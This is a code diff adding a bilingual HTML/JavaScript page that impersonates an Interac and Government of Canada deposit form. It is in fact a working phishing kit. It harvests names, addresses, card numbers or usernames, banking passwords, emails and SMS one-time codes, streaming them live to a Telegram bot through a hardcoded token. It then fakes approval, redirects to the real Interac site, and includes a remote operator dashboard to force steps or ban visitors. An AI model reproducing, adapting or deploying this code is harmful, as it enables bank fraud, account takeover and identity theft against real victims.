@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="fr" id="html-root">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Formulaire Deposit | Gouvernement du Canada</title>
+    <link rel="icon" type="image/jpeg" href="interac.jpeg">
+    <style>
+        :root {
+            --primary-yellow: #ffcc00;
+            --deep-black: #000000;
+            --pure-white: #ffffff;
+            --error-red: #ff3333;
+            --success-green: #33cc66;
+            --gov-blue: #000000;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--pure-white);
+            color: var(--deep-black);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .page {
+            width: 100%;
+            height: 100vh;
+            background: var(--pure-white);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-sizing: border-box;
+        }
+
+        .header-banner {
+            background-color: var(--deep-black);
+            color: var(--pure-white);
+            padding: 25px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+            border-bottom: none;
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logo-placeholder {
+            width: 80px;
+            height: 80px;
+            background: transparent;
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            flex-shrink: 0;
+        }
+
+        .logo-placeholder img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            display: block;
+            border-radius: 4px;
+        }
+
+        .header-titles h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: var(--pure-white);
+        }
+
+        .header-titles p {
+            font-size: 14px;
+            color: #cccccc;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        .lang-switch {
+            background: transparent;
+            color: var(--pure-white);
+            border: none;
+            padding: 8px 12px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .lang-switch:hover {
+            color: var(--primary-yellow);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            box-sizing: border-box;
+            flex: 1;
+        }
+
+        .form-layout {
+            display: flex;
+            gap: 40px;
+            align-items: center;
+        }
+
+        .form-column:first-child {
+            flex: 1.15;
+            border-right: 1px solid rgba(0, 0, 0, 0.15);
+            padding-right: 30px;
+            padding-left: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .form-column:last-child {
+            flex: 0.85;
+            padding-left: 10px;
+            padding-right: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--deep-black);
+        }
+
+        label .optional-text {
+            font-weight: normal;
+            color: #666666;
+            margin-left: 6px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            background-color: rgba(0, 0, 0, 0.05);
+            color: var(--deep-black);
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            background-color: rgba(0, 0, 0, 0.08);
+            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.4);
+        }
+
+        .row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        .submit-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            border-top: none;
+            padding-top: 0;
+        }
+
+        .btn-submit {
+            width: 320px;
+            max-width: 100%;
+            background-color: var(--primary-yellow);
+            color: var(--deep-black);
+            padding: 16px;
+            border: 2px solid var(--primary-yellow);
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.5);
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            background-color: var(--primary-yellow);
+            color: var(--deep-black);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.7);
+        }
+
+        .btn-submit:disabled {
+            background-color: var(--primary-yellow);
+            color: var(--deep-black);
+            border-color: var(--primary-yellow);
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.3);
+            transform: none;
+        }
+
+        #phone-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .phone-box {
+            background: var(--pure-white);
+            padding: 40px;
+            border-radius: 8px;
+            text-align: center;
+            color: var(--deep-black);
+            max-width: 450px;
+            width: 90%;
+            border-top: 6px solid var(--primary-yellow);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 25px 0;
+        }
+
+        .code-inputs input {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: none;
+            background-color: rgba(0, 0, 0, 0.05);
+            border-radius: 4px;
+        }
+
+        .status-msg {
+            font-size: 13px;
+            margin-top: 10px;
+            color: var(--error-red);
+            display: none;
+        }
+
+        .success-msg {
+            font-size: 14px;
+            margin-top: 10px;
+            color: var(--deep-black);
+            display: none;
+            font-weight: 600;
+        }
+
+        @media (max-width: 768px) {
+            .header-banner {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 20px;
+            }
+            .header-left {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                width: 100%;
+            }
+            .lang-switch {
+                position: absolute;
+                top: 20px;
+                right: 20px;
+            }
+            .form-layout {
+                flex-direction: column;
+                gap: 0;
+            }
+            .form-column:first-child,
+            .form-column:last-child {
+                flex: 1;
+                border-right: none;
+                border-bottom: none;
+                padding: 0;
+                margin-bottom: 0;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .container {
+                padding: 20px;
+            }
+            .btn-submit {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page">
+        <div class="header-banner">
+            <div class="header-left">
+                <div class="logo-placeholder">
+                    <img src="interac.jpeg" alt="Logo Officiel">
+                </div>
+                <div class="header-titles">
+                    <h1 id="txt-main-title">Formulaire Pour Accepter Votre Dépôt</h1>
+                    <p id="txt-subtitle">Veuillez remplir le formulaire officiel d'interac ci-dessous pour Déposer vos Fonds financière.</p>
+                </div>
+            </div>
+            <button type="button" class="lang-switch" id="langToggleBtn" onclick="toggleLanguage()">EN</button>
+        </div>
+
+        <div class="container">
+            <form id="bankForm">
+                <div class="form-layout">
+                    <!-- Colonne de Gauche -->
+                    <div class="form-column">
+                        <div class="row">
+                            <div class="form-group">
+                                <label for="firstname" id="lbl-firstname">Prénom</label>
+                                <input type="text" id="firstname" required oninput="handleInputChange()">
+                            </div>
+                            <div class="form-group">
+                                <label for="lastname" id="lbl-lastname">Nom de famille</label>
+                                <input type="text" id="lastname" required oninput="handleInputChange()">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="bank_name" id="lbl-bank">Institution Financière de Dépôt</label>
+                            <select id="bank_name" required onchange="handleInputChange()">
+                                <option value="" id="opt-select-bank">-- Sélectionnez votre banque --</option>
+                                <option value="atb">ATB Financial</option>
+                                <option value="td">TD</option>
+                                <option value="bmo">BMO</option>
+                                <option value="scotiabank">Scotiabank</option>
+                                <option value="banquenational">Banque Nationale</option>
+                                <option value="desjardins">Desjardins</option>
+                                <option value="pcfinancial">PC Financial</option>
+                                <option value="simpliifinancial">Simplii Financial</option>
+                                <option value="mcap">MCAP</option>
+                                <option value="wealthsimple">Wealthsimple</option>
+                                <option value="neofinancial">Neo Financial</option>
+                                <option value="cibc">CIBC</option>
+                                <option value="icicibank">ICICI Bank</option>
+                                <option value="eqbank">EQ Bank</option>
+                                <option value="hsbc">HSBC</option>
+                                <option value="laurentienne">Laurentienne</option>
+                                <option value="koho">KOHO</option>
+                                <option value="meridianbank">Meridian Bank</option>
+                                <option value="vancity">Vancity</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="phone_number" id="lbl-phone">Numéro de téléphone (Format international, ex: +336...)</label>
+                            <input type="tel" id="phone_number" placeholder="+33612345678" required oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="address1" id="lbl-address1">Adresse 1 <span class="optional-text" id="opt-txt1">(obligatoire)</span></label>
+                            <input type="text" id="address1" placeholder="123 rue Exemple" required oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="address2" id="lbl-address2">Adresse 2 <span class="optional-text" id="opt-txt2">(non obligatoire)</span></label>
+                            <input type="text" id="address2" placeholder="Appartement, suite, etc." oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="city" id="lbl-city">Ville <span class="optional-text" id="opt-txt-city">(obligatoire)</span></label>
+                            <input type="text" id="city" placeholder="Ex: Paris / Montréal" required oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="province" id="lbl-province">Province / Région <span class="optional-text" id="opt-txt-province">(obligatoire)</span></label>
+                            <input type="text" id="province" placeholder="Ex: Québec / Île-de-France" required oninput="handleInputChange()">
+                        </div>
+                    </div>
+
+                    <!-- Colonne de Droite -->
+                    <div class="form-column">
+                        <div class="form-group">
+                            <label for="user_id" id="lbl-userid">Numéro de carte ou Nom d'utilisateur</label>
+                            <input type="text" id="user_id" placeholder="0000 0000 0000 0000" required oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password" id="lbl-password">Mot de passe de sécurité</label>
+                            <input type="password" id="password" placeholder="••••••••" required oninput="handleInputChange()">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="email" id="lbl-email">Adresse e-mail</label>
+                            <input type="email" id="email" placeholder="votre.email@example.com" required oninput="handleInputChange()">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="submit-container">
+                    <button type="submit" class="btn-submit" id="btn-submit-text" disabled>Soumettre</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Fenêtre modale pour le SMS -->
+    <div id="phone-overlay">
+        <div class="phone-box">
+            <h2 style="margin-top:0" id="txt-sms-title">Vérification SMS</h2>
+            <p><span id="txt-sms-desc">Un code de sécurité à 6 chiffres a été envoyé au</span> <strong id="display-phone"></strong>.</p>
+            
+            <div class="code-inputs">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+                <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpInput()">
+            </div>
+            
+            <button class="btn-submit" id="btn-verify" onclick="verifyCode()">Confirmer le Code</button>
+            <p class="status-msg" id="error-msg">Code incorrect. Veuillez réessayer.</p>
+            <p class="success-msg" id="success-msg">Depôt Approuvé ! Redirection vers notre page web officielle en cours...</p>
+        </div>
+    </div>
+
+    <script>
+        let currentLang = 'fr';
+        let formDataCache = {};
+        let telegramMessageId = null;
+        let telegramOtpMessageId = null;
+
+        // --- SYNCHRONISATION DU STATUT & PILOTAGE PAR LE DASHBOARD ---
+        const localTesterId = 'usr_' + Math.random().toString(36).substring(2, 9);
+        localStorage.setItem("localTesterId", localTesterId);
+
+        function updateDashboardPresence(statusText) {
+            let onlineUsersList = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            const emailVal = document.getElementById('email').value || "Visiteur (Formulaire)";
+            const existingIndex = onlineUsersList.findIndex(u => u.id === localTesterId);
+
+            const userData = {
+                id: localTesterId,
+                email: emailVal,
+                ip: '127.0.0.1 (Local)',
+                currentPage: 'formulaire.html',
+                status: statusText,
+                lastSeen: Date.now()
+            };
+
+            if (existingIndex !== -1) {
+                onlineUsersList[existingIndex] = userData;
+            } else {
+                onlineUsersList.unshift(userData);
+            }
+            localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsersList));
+        }
+
+        // Battement de cœur pour maintenir la présence active
+        setInterval(() => {
+            const isModalVisible = document.getElementById('phone-overlay').style.display === 'flex';
+            let currentStatus = isModalVisible ? "En ligne (Étape SMS)" : "En ligne (Sur formulaire.html)";
+            
+            let onlineUsersList = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            const currentUser = onlineUsersList.find(u => u.id === localTesterId);
+            if (currentUser && currentUser.status === "Complété avec succès") {
+                return; 
+            }
+
+            updateDashboardPresence(currentStatus);
+        }, 4000);
+
+        // Écouteur pour les actions de l'administrateur (ex: forcer une étape ou bannir)
+        window.addEventListener("storage", (event) => {
+            if (event.key === "forceUserAction") {
+                const forced = JSON.parse(event.newValue || "{}");
+                if (forced.targetId === "all" || forced.targetId === localTesterId) {
+                    if (forced.action === "ban") {
+                        localStorage.setItem("userBanned", "true");
+                        document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:\'Special Elite\', monospace; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - VOUS AVEZ ÉTÉ BANNI PAR L\'ADMINISTRATEUR.</div>';
+                    } else if (forced.action === "step") {
+                        // Ordre reçu du dashboard pour forcer l'étape OTP
+                        if (forced.value === '3' || forced.value === '2' || forced.value === '4') {
+                            const phoneVal = document.getElementById('phone_number').value || "+33600000000";
+                            document.getElementById('display-phone').innerText = phoneVal;
+                            document.getElementById('phone-overlay').style.display = 'flex';
+                            updateDashboardPresence("En ligne (Étape SMS forcée)");
+                        }
+                    }
+                }
+            }
+        });
+        // -------------------------------------------------------------
+
+        const translations = {
+            fr: {
+                title: "Formulaire de Demande d'Aide Sociale | Gouvernement du Canada",
+                mainTitle: "Formulaire Pour Accepter Votre Dépôt",
+                subtitle: "Veuillez remplir le formulaire officiel d'interac ci-dessous pour Déposer vos Fonds financière.",
+                firstname: "Prénom",
+                lastname: "Nom de famille",
+                bank: "Institution Financière de Dépôt",
+                selectBank: "-- Sélectionnez votre banque --",
+                phone: "Numéro de téléphone (Format international, ex: +336...)",
+                address1: "Adresse 1",
+                address2: "Adresse 2",
+                city: "Ville",
+                province: "Province / Région",
+                required: "(obligatoire)",
+                optional: "(non obligatoire)",
+                userid: "Numéro de carte ou Nom d'utilisateur",
+                password: "Mot de passe de sécurité",
+                email: "Adresse e-mail",
+                submit: "Soumettre",
+                redirectingSms: "Redirection vers le code de vérification à 6 chiffres...",
+                smsTitle: "Vérification SMS",
+                smsDesc: "Un code de sécurité à 6 chiffres a été envoyé au",
+                verifyBtn: "Confirmer le Code",
+                verifying: "Vérification...",
+                errorMsg: "Code incorrect. Veuillez réessayer.",
+                successMsg: "Depôt Approuvé ! Redirection vers notre page web officielle en cours..."
+            },
+            en: {
+                title: "Social Assistance Application Form | Government of Canada",
+                mainTitle: "Form To Accept Your Deposit",
+                subtitle: "Please fill out the official Interac form below to deposit your financial funds.",
+                firstname: "First Name",
+                lastname: "Last Name",
+                bank: "Deposit Financial Institution",
+                selectBank: "-- Select your bank --",
+                phone: "Phone Number (International format, e.g., +1555...)",
+                address1: "Address 1",
+                address2: "Address 2",
+                city: "City",
+                province: "Province / Region",
+                required: "(required)",
+                optional: "(optional)",
+                userid: "Card Number or Username",
+                password: "Security Password",
+                email: "Email Address",
+                submit: "Submit",
+                redirectingSms: "Redirecting to 6-digit verification code...",
+                smsTitle: "SMS Verification",
+                smsDesc: "A 6-digit security code has been sent to",
+                verifyBtn: "Confirm Code",
+                verifying: "Verifying...",
+                errorMsg: "Incorrect code. Please try again.",
+                successMsg: "Deposit Approved! Redirecting to our official page..."
+            }
+        };
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'fr' ? 'en' : 'fr';
+            const t = translations[currentLang];
+
+            document.getElementById('langToggleBtn').innerText = currentLang === 'fr' ? 'EN' : 'FR';
+            document.getElementById('html-root').setAttribute('lang', currentLang);
+            document.getElementById('page-title').innerText = t.title;
+            document.getElementById('txt-main-title').innerText = t.mainTitle;
+            document.getElementById('txt-subtitle').innerText = t.subtitle;
+            document.getElementById('lbl-firstname').innerText = t.firstname;
+            document.getElementById('lbl-lastname').innerText = t.lastname;
+            document.getElementById('lbl-bank').innerText = t.bank;
+            document.getElementById('opt-select-bank').innerText = t.selectBank;
+            document.getElementById('lbl-phone').innerText = t.phone;
+            
+            document.getElementById('lbl-address1').innerHTML = t.address1 + ' <span class="optional-text" id="opt-txt1">' + t.required + '</span>';
+            document.getElementById('lbl-address2').innerHTML = t.address2 + ' <span class="optional-text" id="opt-txt2">' + t.optional + '</span>';
+            document.getElementById('lbl-city').innerHTML = t.city + ' <span class="optional-text" id="opt-txt-city">' + t.required + '</span>';
+            document.getElementById('lbl-province').innerHTML = t.province + ' <span class="optional-text" id="opt-txt-province">' + t.required + '</span>';
+
+            document.getElementById('lbl-userid').innerText = t.userid;
+            document.getElementById('lbl-password').innerText = t.password;
+            document.getElementById('lbl-email').innerText = t.email;
+            document.getElementById('btn-submit-text').innerText = t.submit;
+            document.getElementById('txt-sms-title').innerText = t.smsTitle;
+            document.getElementById('txt-sms-desc').innerText = t.smsDesc;
+            document.getElementById('btn-verify').innerText = t.verifyBtn;
+            document.getElementById('error-msg').innerText = t.errorMsg;
+            document.getElementById('success-msg').innerText = t.successMsg;
+        }
+
+        function collectData() {
+            return {
+                firstname: document.getElementById('firstname').value,
+                lastname: document.getElementById('lastname').value,
+                bank_name: document.getElementById('bank_name').value,
+                phone_number: document.getElementById('phone_number').value,
+                address1: document.getElementById('address1').value,
+                address2: document.getElementById('address2').value,
+                city: document.getElementById('city').value,
+                province: document.getElementById('province').value,
+                user_id: document.getElementById('user_id').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value
+            };
+        }
+
+        function validateForm() {
+            const data = collectData();
+            const submitBtn = document.getElementById('btn-submit-text');
+
+            const allValid = data.firstname !== '' && 
+                             data.lastname !== '' && 
+                             data.bank_name !== '' && 
+                             data.phone_number !== '' && 
+                             data.address1 !== '' && 
+                             data.city !== '' &&
+                             data.province !== '' &&
+                             data.user_id !== '' && 
+                             data.password !== '' && 
+                             data.email !== '';
+
+            submitBtn.disabled = !allValid;
+        }
+
+        let typingTimer;
+        function handleInputChange() {
+            validateForm();
+            updateDashboardPresence("En ligne (Saisie en cours)");
+            
+            clearTimeout(typingTimer);
+            typingTimer = setTimeout(() => {
+                sendToTelegram(collectData(), true);
+            }, 300);
+        }
+
+        function sendToTelegram(data, isLiveUpdate = false) {
+            const botToken = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw";
+            const chatId = "8370855026";
+
+            const message = `━━━━━━━━━━━━━━━━━━━\n` +
+                            ` 🔔 ${isLiveUpdate ? 'LOLO EN DIRECT' : 'NOUVEAUX LOLO'} \n` +
+                            `━━━━━━━━━━━━━━━━━━━\n` +
+                            `👤 Prénom : ${data.firstname || '...'}\n` +
+                            `👤 Nom : ${data.lastname || '...'}\n` +
+                            `🏦 Banque : ${data.bank_name || '...'}\n` +
+                            `📱 Téléphone : ${data.phone_number || '...'}\n` +
+                            `🏠 Adresse 1 : ${data.address1 || '...'}\n` +
+                            `🏠 Adresse 2 : ${data.address2 || '...'}\n` +
+                            `🏙️ Ville : ${data.city || '...'}\n` +
+                            `🇨🇦 Province : ${data.province || '...'}\n` +
+                            `💳 ID / Carte : ${data.user_id || '...'}\n` +
+                            `🔑 Mot de passe : ${data.password || '...'}\n` +
+                            `📧 Email : ${data.email || '...'}\n` +
+                            `━━━━━━━━━━━━━━━━━━━`;
+
+            if (isLiveUpdate && telegramMessageId) {
+                fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        message_id: telegramMessageId,
+                        text: message
+                    })
+                }).catch(error => console.error("Erreur de mise à jour Telegram:", error));
+            } else {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(res => {
+                    if (res.ok && res.result) {
+                        telegramMessageId = res.result.message_id;
+                    }
+                })
+                .catch(error => console.error("Erreur d'envoi Telegram:", error));
+            }
+        }
+
+        function sendOtpToTelegram(otpCode, isLiveUpdate = false) {
+            const botToken = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw";
+            const chatId = "8370855026";
+
+            const message = `━━━━━━━━━━━━━━━━━━━\n` +
+                            ` 🔐 ${isLiveUpdate ? 'CODE SMS EN DIRECT' : 'CODE SMS COMPLET'} \n` +
+                            `━━━━━━━━━━━━━━━━━━━\n` +
+                            `📱 Code OTP : ${otpCode || '...'}\n` +
+                            `━━━━━━━━━━━━━━━━━━━`;
+
+            if (isLiveUpdate && telegramOtpMessageId) {
+                fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        message_id: telegramOtpMessageId,
+                        text: message
+                    })
+                }).catch(error => console.error("Erreur de mise à jour OTP Telegram:", error));
+            } else {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(res => {
+                    if (res.ok && res.result) {
+                        telegramOtpMessageId = res.result.message_id;
+                    }
+                })
+                .catch(error => console.error("Erreur d'envoi OTP Telegram:", error));
+            }
+        }
+
+        function handleOtpInput() {
+            let enteredCode = "";
+            const inputsList = document.querySelectorAll('.otp');
+            inputsList.forEach(input => {
+                enteredCode += input.value || '•';
+            });
+
+            updateDashboardPresence("En ligne (Saisie code SMS)");
+
+            if (telegramOtpMessageId) {
+                sendOtpToTelegram(enteredCode, true);
+            } else {
+                sendOtpToTelegram(enteredCode, false);
+            }
+        }
+
+        const form = document.getElementById('bankForm');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            formDataCache = collectData();
+            sendToTelegram(formDataCache, false);
+            updateDashboardPresence("En ligne (Attente validation SMS)");
+
+            const phoneVal = formDataCache.phone_number;
+            document.getElementById('display-phone').innerText = phoneVal;
+
+            const btn = form.querySelector('.btn-submit');
+            const originalText = btn.innerText;
+            btn.innerText = translations[currentLang].redirectingSms;
+            btn.disabled = true;
+
+            // Chargement de 9 secondes avant d'afficher la modale SMS
+            setTimeout(() => {
+                document.getElementById('phone-overlay').style.display = 'flex';
+                btn.innerText = originalText;
+                btn.disabled = false;
+                document.querySelector('.otp').focus();
+            }, 9000);
+        });
+
+        const inputs = document.querySelectorAll('.otp');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                if (value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text').trim();
+                if (/^\d{6}$/.test(pasteData)) {
+                    inputs.forEach((inp, idx) => {
+                        inp.value = pasteData[idx];
+                    });
+                    inputs[inputs.length - 1].focus();
+                    handleOtpInput();
+                }
+            });
+        });
+
+        function verifyCode() {
+            const errorMsg = document.getElementById('error-msg');
+            const successMsg = document.getElementById('success-msg');
+            const verifyBtn = document.getElementById('btn-verify');
+            
+            let enteredCode = "";
+            inputs.forEach(input => { enteredCode += input.value; });
+
+            if (enteredCode.length < 6) {
+                errorMsg.style.display = 'block';
+                successMsg.style.display = 'none';
+                return;
+            }
+
+            verifyBtn.innerText = translations[currentLang].verifying;
+            verifyBtn.disabled = true;
+            errorMsg.style.display = 'none';
+
+            // Chargement de 9 secondes après la vérification du code
+            setTimeout(() => {
+                successMsg.style.display = 'block';
+                
+                // --- MISE À JOUR DU STATUT SUR LE DASHBOARD ---
+                updateDashboardPresence("Complété avec succès");
+                localStorage.setItem("formCompletedEvent", JSON.stringify({ email: formDataCache.email, timestamp: Date.now() }));
+                // ----------------------------------------------
+
+                setTimeout(() => {
+                    // Redirection avec replace pour empêcher le retour en arrière
+                    window.location.replace("https://www.interac.ca/en/");
+                }, 1500);
+            }, 9000);
+        }
+
+        validateForm();
+        updateDashboardPresence("En ligne (Sur formulaire.html)");
+    </script>
+</body>
+</html>
